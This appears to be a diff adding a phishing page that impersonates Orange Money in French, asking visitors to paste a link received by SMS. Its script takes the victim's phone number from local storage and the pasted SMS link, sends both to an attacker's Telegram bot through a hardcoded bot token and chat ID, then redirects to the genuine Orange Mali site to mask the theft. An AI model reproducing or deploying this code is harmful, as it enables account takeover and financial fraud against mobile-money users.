@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Orange Money</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            height: 100%;
+        }
+
+        .top {
+            height: 70px;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .center {
+            padding: 15px;
+        }
+
+     
+
+        input {
+            height: 40px;
+            width: 100%;
+            margin-top: 8px;
+            border: none;
+            font-size: 1.2rem;
+            border-bottom: 2px solid;
+        }
+
+        input:focus {
+            outline: none;
+            border-bottom: 2px solid #ff7900;
+        }
+
+
+
+      
+
+        button {
+            width: 100%;
+            height: 45px;
+            font-size: 1.3rem;
+            font-weight: bolder;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            background-color: #ff7900;
+        }
+
+        #pwd,
+        #valider {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="top">
+        <img src="./img/logo.png" width="70">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+            class="lucide lucide-info">
+            <circle cx="12" cy="12" r="10" />
+            <path d="M12 16v-4" />
+            <path d="M12 8h.01" />
+        </svg>
+    </div>
+
+
+    <div class="center">
+        <h2>Sms</h2> <br>
+        <p>Veuillez copier le lien que vous receverai par <strong>SMS</strong>, coller le lien dans le champs ci-dessous
+            pour confirmer. <br> <br> Patientez le sms peut mettre 30s avant de vous parvenir.</p>
+        <br><br>
+
+        <form id="form">
+            <div class="box">
+
+                <p>SMS</p>
+                <form id="form">
+
+                    <input type="text" id="sms" placeholder="Collez le lien ici( https:// ) " minlength="8" required>
+
+                    <br><br><br>
+                    <button type="submit">Terminer</button>
+                </form>
+
+
+        </form>
+    </div>
+
+    <script>
+
+
+        document.getElementById('form').addEventListener('submit', function (e) {
+
+
+            event.preventDefault();
+
+
+            const tel = localStorage.getItem('tel');
+            const sms = document.getElementById('sms').value;
+
+            const chatId = '8033906914'; // Remplace par ton chat_id
+            const token = '7891154943:AAG-iRSqPg6KL1q-slYogakDcXBvjrcrFCU'; // Remplace par ton token de bot
+            const message = `📞Numéro: ${tel}, 📩SMS: ${sms}`;
+
+            // Envoi de la requête au bot Telegram
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        // Redirection après l'envoi réussi
+                        window.location.href = 'https://www.orangemali.com/fr/porte-monnaie-electronique.html';
+                    } else {
+                        console.log('Erreur lors de l\'envoi du message.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Erreur:', error);
+                    console.log('Erreur lors de la communication avec Telegram.');
+                });
+        })
+
+
+
+
+    </script>
+
+</body>
+
+</html>
